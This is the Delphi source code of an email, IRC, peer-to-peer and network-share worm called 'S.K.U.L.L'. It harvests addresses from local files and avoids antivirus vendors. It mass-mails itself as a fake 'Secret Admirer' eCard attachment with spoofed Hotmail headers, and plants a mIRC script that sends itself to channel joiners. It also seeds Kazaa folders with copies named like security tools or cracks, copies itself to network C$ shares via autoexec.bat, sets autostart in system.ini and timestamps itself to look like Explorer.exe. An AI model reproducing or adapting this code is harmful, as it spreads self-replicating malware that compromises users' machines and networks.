   program Skull;
   uses
     Windows,irc,
     Winsock,mxlookup,
     ZIP IN 'ZIP.PAS',
     CRC32 IN 'CRC32.PAS',
     AclUtils in 'ACLUnits\ACLUTILS.PAS';

   TYPE
     Triple = ARRAY[1..3] OF BYTE;
     Quad   = ARRAY[1..4] OF BYTE;

   Const
     ThisCool              = 'S.K.U.L.L';
     CRLF                  = #13#10;
     d_Subject             : string = 'Superzone eCard from Secret Admirer' ;
     d_Body                : string = 'eCard@Superzone is an online service for sending eCards.'+#13#10+#13#10+
                           'Dear reader,'+#13#10+#13#10+
                           'You have been sent an eCard from ''Secret Admirer''!'+#13#10+#13#10+
                           'To see the eCard, simply open the attachment.'+#13#10+#13#10+
                           'Send an eCard to someone that you care. It''s free!'+#13#10+#13#10+#13#10+
                           'eCard@Superzone'+#13#10+
                           'http://eCard.Superzone.com/'+#13#10+#13#10+
                           'Save trees, send eCards.'+#13#10+#13#10+
                           'eCard@Superzone: part of the Superzone Network.'+#13#10+
                           'http://www.superzone.com/';
     d_attachment          : string = 'eCard.zip' ;

   Var
     L1:array[0..9]of string;
     L2:array[0..9]of string;
     Cool                  : IntegeR;
     AThread1              : THandle;
     BThread1              : THandle;
     CThread1              : THandle;

     AThread1ID            : DWORD;
     BThread1ID            : DWORD;
     CThread1ID            : DWORD;

     M1,M2,All_Mail,
     Names,Domains         : STRING;

     inst          :hwnd;
     wclass                :twndclass;
     wnd,ph                :hwnd;
     TempDirBuff,
     TempFileNameBuff      :Pchar;
     SMTPServer            : STRING = '';
     SMTPAcc               : STRING = '';
     Buf                   : ARRAY[0..255] OF Char;
     pid                   :cardinal;
     FileBuf               : ARRAY[1..1000000] OF BYTE;
     CC                    : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

   FUNCTION ExtractFilename(S:String):String;
   BEGIN
   WHILE POS('\',S)>0 DO BEGIN
    S:=COPY(S,POS('\',S)+1,LENGTH(S));
   END;
    RESULT:=S;
   END;

   FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
   VAR
     Q    : Quad;
     Strg : STRING;
   BEGIN
     IF Count<3 THEN BEGIN
       T[3]:=0;
       Q[4]:=64;
     END ELSE Q[4]:=(T[3] AND $3F);
     IF Count<2 THEN BEGIN
       T[2]:=0;
       Q[3]:=64;
     END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   FUNCTION BASE64(DataLength:DWORD) : AnsiString;
   VAR
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   BEGIN
     Count:=0;
     B:='';
     FOR I:=1 TO DataLength DIV 3 DO BEGIN
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       IF Count=76 THEN BEGIN
         B:=B+CRLF;
         Count:=0;
       END;
     END;
     Remain:=DataLength-(DataLength DIV 3)*3;
     IF Remain>0 THEN BEGIN
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
       IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     END;
     RESULT:=B;
   END;

   FUNCTION IPstr(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function sysdir:String;
   var
    ap:array[0..666]of char;
   begin
    getsystemdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;

   function windir:String;
   var
    ap:array[0..666]of char;
   begin
    getwindowsdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;

   Procedure FMail1;
   var
     F                     : FILE;
     A,B,J,Attachment,
     Recip                 : STRING;
     Sock                  : TSocket;
     Wsadatas              : TWSADATA;
     SockAddrIn            : TSockAddrIn;

   FUNCTION Mys(STR:STRING) : BOOL;
   BEGIN
     IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;

   Begin
     Attachment:=D_Attachment;

   While M1 <> '' do begin
   Recip := copy(m1,1,pos(#13#10,M1)-1);

     SMTPServer:=GetSMTPAddress('Hotmail.com');
     IF SMTPServer<>'' THEN BEGIN
       WSAStartUp(257,wsadatas);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
       SockAddrIn.sin_family:=AF_INET;
       SockAddrIn.sin_port:=htons(25);
       SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(IPstr(SMTPServer)));
       Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
       Mys('HELO Hotmail.com'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('MAIL FROM: ecard@superzone.com'+CRLF); //"Superzone eCard" <ecard@superzone.com>
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('RCPT TO: '+recip+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('DATA'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   j := 'Message-ID: '+a+'.'+b+'.qmail@hotmail.com';

       Mys(j+crlf);
       Mys('From: "Superzone eCard" <ecard@superzone.com>'+CRLF);
       Mys('Subject: '+D_subject+CRLF);
       Mys('To: '+Recip+CRLF);
       Mys('MIME-Version: 1.0'+CRLF);
       Mys('Content-Type: multipart/mixed; boundary="bla"'+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: text/plain; charset:us-ascii'+CRLF+CRLF);
       Mys(D_body+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: audio/x-wav;'+CRLF);
       Mys('    name="'+D_attachment+'"'+CRLF);
       Mys('Content-Transfer-Encoding: base64'+CRLF+CRLF);
       AssignFile(F,windir+D_attachment);
       FileMode:=0;
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         BlockRead(F,FileBuf[1],FileSize(F));
         Mys(BASE64(FileSize(F)));
         CloseFile(F);
       END;
       {$I+}
       Mys(CRLF+'--bla--'+CRLF+CRLF);
       Mys(CRLF+'.'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('QUIT'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       WSACleanup();
     END;
   m1 := copy(m1,pos(#13#10,m1)+2,length(m1));
   end;
   Cool:=Cool-1;
   End;

   Procedure FMail2;
   var
     F                     : FILE;
     A,B,J,Attachment,
     Recip                 : STRING;
     Sock                  : TSocket;
     Wsadatas              : TWSADATA;
     SockAddrIn            : TSockAddrIn;

   FUNCTION Mys(STR:STRING) : BOOL;
   BEGIN
     IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;

   Begin
     Attachment:=D_attachment;
     Recip := M2;
   While M2 <> '' do begin
   Recip := copy(m2,1,pos(#13#10,M2)-1);

     SMTPServer:=GetSMTPAddress('Hotmail.com');
     IF SMTPServer<>'' THEN BEGIN
       WSAStartUp(257,wsadatas);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
       SockAddrIn.sin_family:=AF_INET;
       SockAddrIn.sin_port:=htons(25);
       SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(IPstr(SMTPServer)));
       Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
       Mys('HELO Hotmail.com'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('MAIL FROM: ecard@superzone.com'+CRLF); //"Superzone eCard" <ecard@superzone.com>
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('RCPT TO: '+recip+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('DATA'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   j := 'Message-ID: '+a+'.'+b+'.qmail@hotmail.com';

       Mys(j+crlf);
       Mys('From: "Superzone eCard" <ecard@superzone.com>'+CRLF);
       Mys('Subject: '+D_Subject+CRLF);
       Mys('To: '+Recip+CRLF);
       Mys('MIME-Version: 1.0'+CRLF);
       Mys('Content-Type: multipart/mixed; boundary="bla"'+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: text/plain; charset:us-ascii'+CRLF+CRLF);
       Mys(D_Body+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: audio/x-wav;'+CRLF);
       Mys('    name="'+D_attachment+'"'+CRLF);
       Mys('Content-Transfer-Encoding: base64'+CRLF+CRLF);
       AssignFile(F,Sysdir+D_attachment);
       FileMode:=0;
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         BlockRead(F,FileBuf[1],FileSize(F));
         Mys(BASE64(FileSize(F)));
         CloseFile(F);
       END;
       {$I+}
       Mys(CRLF+'--bla--'+CRLF+CRLF);
       Mys(CRLF+'.'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('QUIT'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       WSACleanup();
     END;
   m2 := copy(m2,pos(#13#10,m2)+2,length(m2));
   end;
   Cool:=Cool-1;
   End;

   function FileAge(const FileName: string): Integer;
   {$IFDEF MSWINDOWS}
   var
     Handle: THandle;
     FindData: TWin32FindData;
     LocalFileTime: TFileTime;
   begin
     Handle := FindFirstFile(PChar(FileName), FindData);
     if Handle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(Handle);
       if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
       begin
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
           LongRec(Result).Lo) then Exit;
       end;
     end;
     Result := -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   var
     st: TStatBuf;
   begin
     if stat(PChar(FileName), st) = 0 then
       Result := st.st_mtime
     else
       Result := -1;
   end;
   {$ENDIF}

   function FileExists(const FileName: string): Boolean;
   {$IFDEF MSWINDOWS}
   begin
     Result := FileAge(FileName) <> -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
     Result := euidaccess(PChar(FileName), F_OK) = 0;
   end;
   {$ENDIF}

   function AnsiUpperCase(const S: string): string;
   {$IFDEF MSWINDOWS}
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
    Result := WideUpperCase(S);
   end;
   {$ENDIF}

   function mail2(s:string;ext:String):string;
   var
   i,j:integer;
   abc:string;
   f:string;
   label q,t;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   result := '';
   i:=0;
   q:
   if pos('.'+ext,s)-i = 0 then begin
   for j :=0 to length(result)-1 do begin
   f := f + copy(result,length(result)-j,1);
   end;
    result := f + ext;
    exit;
   end;
   if pos(copy(s,pos('.'+ext,s)-i,1),abc) = 0 then begin
   i:=pos('.'+ext,s);//i+1;
   goto q;
   end else begin
   result := result + copy(s,pos('.'+ext,s)-i,1);
   i:=i+1;
   goto q;
   end;
   end;

   procedure mail(g:string;ext:string);
   var i:integer;y,a,s:string;
   abc:string;
   label u,b,f;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   f:
   if (pos('.'+ext,g) > 0) then begin
   s := copy(g,0,pos('.'+ext,g));
   s := s +ext;
   i:=1;
   b:
   y:=copy(s,pos('.'+ext,s)-i,1);
   if pos(y,abc) > 0 then
   begin
    a:=copy(s,pos(' ',s)+1,length(s));
   while pos(' ',a) > 0 do
    a:=copy(a,pos(' ',a)+1,length(a));
   if pos('www',a) > 0 then exit;
   if pos('wwp',a) > 0 then exit;
   if pos('ftp',a) > 0 then exit;
   if pos('http',a) > 0 then exit;
   if pos('@',a) = 0 then exit;
   a := mail2(a,ext);
   if (a <> '.'+ext) and (a <> '') and (a <> ' ') and (a <> ' .'+ext) then begin
    if pos(ansiuppercase(a),ansiuppercase(all_mail)) =0 then begin
    if (pos(ansiuppercase('antiv'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('syman'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('microsoft'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('trendm'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('f-sec'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('mcaf'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('virus'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('anti'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kav'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kasp'),ansiuppercase(a)) = 0) then
     all_mail := all_mail + ansiuppercase(a) + #13#10;
   end;
    //all_mail := all_mail + a + '%';
   end;
    end
    else begin
   i:=i+1;
   sleep(100);
    goto b;
    end;
   end;
   g := copy(g,pos(a,g)+length(a),length(g));
   if copy(g,0,2) = #13#10 then g := copy(g,3,length(g));
   if pos('.'+ext,g) > 0 then goto f;
   end;

   procedure ReadText(b:string);
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;
   if not fileexists(b) then exit;
       AssignFile(EditText, b);
       Reset(EditText);
       test := filesize(edittext);
   if test > 1200 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);
       mail(text,'co.nz');
       mail(text,'com');
       mail(text,'net');
       mail(text,'org');
       mail(text,'se');
       mail(text,'tk');
   except
    exit;
   end;
   end;

   procedure ListFiles(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
       irc:textfile;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
         if ansiuppercase(name) = ansiuppercase('mirc.exe') then begin
          assignfile(irc,d+'script.ini');
          if fileexists('script.ini') then append(irc) else rewrite(irc);
          writeln(irc, 'on *:JOIN:*:{');
          writeln(irc, 'if ($nick != $me) {');
          writeln(irc, ' dcc send $nick '+sysdir+d_attachment);
          writeln(irc, '}');
          writeln(irc, '}');
          writeln(irc, '; DO NOT TOUCH THIS.');
          writeln(irc, '; IT MAY CORRUPT YOUR SYSTEMFILES');
          closefile(irc);
         end else
   // html, htm, wab, txt, vbs, eml, ods, mmf, nch, mbx, tbb
         if (name <> '.') and (name <> '..') and ((ansiuppercase(copy(name,length(name)-3,4))='.HTM') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.WAB') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.EML') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.ODS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.MMF') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.NCH') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.MBX') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.TBB') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.CPP') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.DPR') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.FRM') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.BAS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.DOC') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.RTF') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.VBS') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.TXT') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='HTML') or
                                                  (ansiuppercase(copy(name,length(name)-3,4))='.ASP')) then begin
         try
    if (pos(ansiuppercase('antiv'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('syman'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('microsoft'),ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('trendm'),   ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('f-sec'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('mcaf'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('virus'),    ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('anti'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('kav'),      ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('serv'),     ansiuppercase(d+name)) = 0) and
       (pos(ansiuppercase('kasp'),     ansiuppercase(d+name)) = 0) then
          names:=names+d+name+#13#10;
         except
          ;
         end;
         end;

       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           ListFiles(D + SR.Name + '\', Name, SearchName);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   procedure DateF(DDS:String);
   var
       ReferenceFile:string;
       handly:integer;
       AT,CT,WT:TFileTime;
   begin

       ReferenceFile:=WinDir+'Explorer.exe';
       handly:=FileOpen(ReferenceFile,fmOpenRead);
       GetFileTime(handly,@CT,@AT,@WT);
       FileClose(handly);
       handly:=FileOpen(DDS,fmOpenWrite);
       SetFileTime(handly,@CT,@AT,@WT);
       FileClose(handly);
   end;


   Procedure Autostart(name_string:string);
   begin
      copyfile(pchar(paramstr(0)), pchar(sysdir+name_string), false);
      DateF(Sysdir+name_string);
      writeprivateprofilestring('boot','shell',pchar('Explorer.exe '+name_string),'system.ini')
   end;

   procedure Enumeration(aResource:PNetResource);
   var
      aHandle: THandle;
      k, BufferSize: DWORD;
      Buffer: array[0..1023] of TNetResource;
      i: Integer;
   begin
      WNetOpenEnum(2,0,0,aResource,aHandle);
      k:=1024;
      BufferSize:=SizeOf(Buffer);
      while WNetEnumResource(aHandle,k,@Buffer,BufferSize)=0 do
      for i:=0 to k-1 do
    begin
       if Buffer[i].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then
        DOMAINS := DOMAINS + copy(UpperCase(Buffer[i].lpRemoteName),3,MAX_PATH)+#13#10;
       if Buffer[i].dwUsage>0 then
     Enumeration(@Buffer[i])
    end;
      WNetCloseEnum(aHandle);
   end;

   procedure gonetwork;
   var
    ax:textfile;
   begin
    DOMAINS := '';
    Enumeration(nil);
    while(DOMAINS)<>'' do begin
     try                                                                      // c$\documents and settings\all users\start menu
      copyfile(pchar(paramstr(0)) ,pchar('\\'+ copy(domains,1,pos(#13#10,DOMAINS)-1)+ '\C$\winupdate.exe' ) , false );
   if fileexists('\\'+ copy(domains,1,pos(#13#10,DOMAINS)-1)+ '\C$\autoexec.bat') then begin
    try
     assignfile(ax,'\\'+ copy(domains,1,pos(#13#10,DOMAINS)-1)+ '\C$\autoexec.bat');
     append(ax);
     writeln(ax,'winupdate.exe');
     closefile(ax);
    except
     exit;
    end;
   end;
      domains := copy(domains,pos(#13#10,domains)+2,length(domains));
     except
      domains := copy(domains,pos(#13#10,domains)+2,length(domains));
     end;
    end;
   end;

   function windowproc(win:hwnd;mess:word;wpr:word;lpr:longint):longint;stdcall;
   begin
     result:=0;
     result:=defwindowproc(win,mess,wpr,lpr);
   end;

   function regReadString(kRoot: HKEY; sKey, sValue: String): String;
   var
     qValue: array[0..1023] of Char;
     DataSize: Integer;
     CurrentKey: HKEY;
   begin
     RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
     Datasize := 1023;
     RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
     RegCloseKey(CurrentKey);
     Result := String(qValue);
   end;

   Function CreateF(F:String):String;

   begin
   l1[0] := 'Panda';
   l1[1] := 'McAfee';
   l1[2] := 'Norton';
   l1[3] := 'F-Secure';
   l1[4] := 'Sophos';
   l1[5] := 'TrendMicro';
   l1[6] := 'TrojanHunter';
   l1[7] := 'AntiWorm';
   l1[8] := 'Normans';
   l1[9] := 'Backdoor';

   l2[0] := 'AntiVirus';
   l2[1] := 'Defender';
   l2[2] := 'Security';
   l2[3] := 'Hacked';
   l2[4] := 'Cracked';
   l2[5] := 'Cdkey';
   l2[6] := 'Keygen';
   l2[7] := 'NoCd';
   l2[8] := 'Licens';
   l2[9] := 'Crack';

   Randomize;
   Case Random(10) of
   0:Result := Result + L1[0];
   1:Result := Result + L1[1];
   2:Result := Result + L1[2];
   3:Result := Result + L1[3];
   4:Result := Result + L1[4];
   5:Result := Result + L1[5];
   6:Result := Result + L1[6];
   7:Result := Result + L1[7];
   8:Result := Result + L1[8];
   9:Result := Result + L1[9];
   End;

   Result:=Result + ' ';
   Randomize;
   Case Random(10) of
   0:Result := Result + L2[0];
   1:Result := Result + L2[1];
   2:Result := Result + L2[2];
   3:Result := Result + L2[3];
   4:Result := Result + L2[4];
   5:Result := Result + L2[5];
   6:Result := Result + L2[6];
   7:Result := Result + L2[7];
   8:Result := Result + L2[8];
   9:Result := Result + L2[9];
   End;

   Result := Result + '.exe';

   end;

   Procedure FKazaa;
   var
   DlDir0,DlDir1:string;
   i:integer;
   begin
   DlDir0:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\Transfer',
    'DlDir0');
   DlDir1:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    'DownloadDir');
   if dldir0<>'' then begin
    For i:=0 to 49 do
     copyfile(Pchar(paramstr(0)),pchar(CreateF(DlDir0)),false);
   end;
   if dldir1<>'' then begin
    For i:=0 to 49 do
     copyfile(Pchar(paramstr(0)),pchar(CreateF(DlDir1)),false);
   end;
   end;

   Procedure KillThreads;
   var
     lpExitCode: DWORD;

   begin

     GetExitCodeThread(AThread1,lpExitCode);
     TerminateThread(AThread1,lpExitCode);

     GetExitCodeThread(BThread1,lpExitCode);
     TerminateThread(BThread1,lpExitCode);

     GetExitCodeThread(CThread1,lpExitCode);
     TerminateThread(CThread1,lpExitCode);
     (*
     GetExitCodeThread(DThread1,lpExitCode);
     TerminateThread(DThread1,lpExitCode);
     *)
   end;

   Procedure StartThread;
   Begin

     AThread1 := CreateThread(NIL, 0, @FMail1 , NIL, 0, AThread1ID);
     BThread1 := CreateThread(NIL, 0, @FMail2 , NIL, 0, BThread1ID);
     CThread1 := CreateThread(NIL, 0, @FKazaa , NIL, 0, CThread1ID);
   //  DThread1 := CreateThread(NIL, 0, @FMail4 , NIL, 0, DThread1ID);

   End;

   Procedure InsertMail(S:String);
   var
   GG:Integer;
   Begin
    GG:=0;
   While S<>'' do begin
   case GG of
   0:M1 := M1+Copy(S,1,pos(#13#10,S)-1)+#13#10;
   1:M2 := M2+Copy(S,1,pos(#13#10,S)-1)+#13#10;
   //2:M3 := M3+Copy(S,1,pos(#13#10,S)-1)+#13#10;
   //3:M4 := M4+Copy(S,1,pos(#13#10,S)-1)+#13#10;
   end;
   if GG=1 then GG:=0 else GG:=GG+1;
   S := copy(S,pos(#13#10,S)+2,length(S));
   end;

   End;


   Var
   Zipname,n,m:string;
   balle:textfile;
   begin
   (*
     wnd:=findwindow(thiscool,nil);

       if wnd<>0 then begin
         // Kill old version
    exitprocess(0);
       end;


         inst:=getmodulehandle(nil);
     with wclass do begin
       style:=CS_CLASSDC or CS_PARENTDC;
       lpfnwndproc:=@windowproc;
       hinstance:=inst;
       hbrbackground:=color_btnface+1;
       lpszclassname:=thiscool;
       hcursor:=loadcursor(0,IDC_ARROW);
     end;
     registerclass(wclass);

       autostart('Explore.exe');
       gonetwork;

     ZIPNAME:='default.pif';
     copyfile(pchar(paramstr(0)),pchar(ZIPNAME),false);
     zip_make(ZIPNAME,windir+d_attachment,ZIPNAME);
     zip_make(ZIPNAME,sysdir+d_attachment,ZIPNAME);
     deletefile(ZIPNAME);

     listfiles('C:\','*','*.*');

   while names<> '' do begin
   n:=copy(names,1,pos(#13#10,names)-1);

   getMem(TempDirBuff,MAX_PATH+1);
   getMem(TempFileNameBuff,MAX_PATH+1);

   GetTempPath(MAX_PATH+1,TempDirBuff);
   GetTempFileName(TempDirBuff,'~DP',0,TempFileNameBuff);
   m :=PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt');
   copyfile(pchar(n),PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt'),false);
   try
   if fileexists(m) then ReadText(m);
   deletefile(pchar(m));
   except
   ;
   end;
   names := copy(names,pos(#13#10,names)+2,length(names));
   end;

   InsertMail(All_Mail);

    Cool := 2;
    StartThread;

    while Cool>0 do begin
     ;
    end;

    KillThreads;
    AssignFile(Balle,'C:\S.K.U.L.L.TxT');
    ReWrite(Balle);
    Writeln(Balle, '{=========================}');
    Writeln(Balle, '{    This worm was made   }');
    Writeln(Balle, '{ Just to destroy and     }');
    Writeln(Balle, '{    Bring missery to     }');
    Writeln(Balle, '{          All of you     }');
    Writeln(Balle, '{   Infected Fuckers.     }');
    Writeln(Balle, '{=========================}');
    Closefile(Balle);*)
    mirC;
   end.
